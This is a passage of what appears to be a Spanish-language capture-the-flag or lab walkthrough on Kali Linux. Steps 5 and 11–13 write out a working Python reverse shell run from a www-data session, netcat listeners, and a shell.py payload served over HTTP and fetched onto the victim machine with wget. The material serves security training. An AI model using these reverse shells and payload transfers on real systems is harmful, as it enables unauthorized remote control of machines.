    5️⃣ Hacer una reverse shell para estabilizar la conexión

        En una terminal en Kali (en el mismo directorio), se ejecuta un listener, donde se recibirá la conexión

            nc -lvnp 1234

        En la sesión obtenida en el navegador (www-data), se introduce el siguiente script:

            python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP local Kali>",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'

    1️⃣0️⃣ Se abre el script test.py 

        cat test.py
        f = open("test.txt", "w")
        f.write("testing 123!")
        f.close()

        Que realiza lo siguiente: 

            1. Abre (o crea si no existe) un archivo llamado test.txt en modo escritura ("w"), en el mismo directorio donde se ejecuta.
            2. Escribe el texto testing 123! dentro de ese archivo.
            3. Cierra el archivo con f.close() al terminar el proceso.

    1️⃣1️⃣ Preparar una listener en Kali (en otra terminal, fuera de la sesión actual)

        nc -lvnp 4445

    1️⃣2️⃣ Crear un script en el directorio actual

        cat > shell.py << 'EOF'
        import socket,subprocess,os
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(("<IP local Kali>",4445))
        os.dup2(s.fileno(),0)
        os.dup2(s.fileno(),1)
        os.dup2(s.fileno(),2)
        import pty
        pty.spawn("bash")
        EOF

        Comprobar que se ha creado correctamente

            cat shell.py

    1️⃣3️⃣ Subir el fichero 

        Ejecutar el listener en Kali para subir el fichero 

            python3 -m http.server 8000

        Ejecutar el comando en la máquina víctima para subir el fichero 

            wget http://<IP local Kali>:8000/shell.py
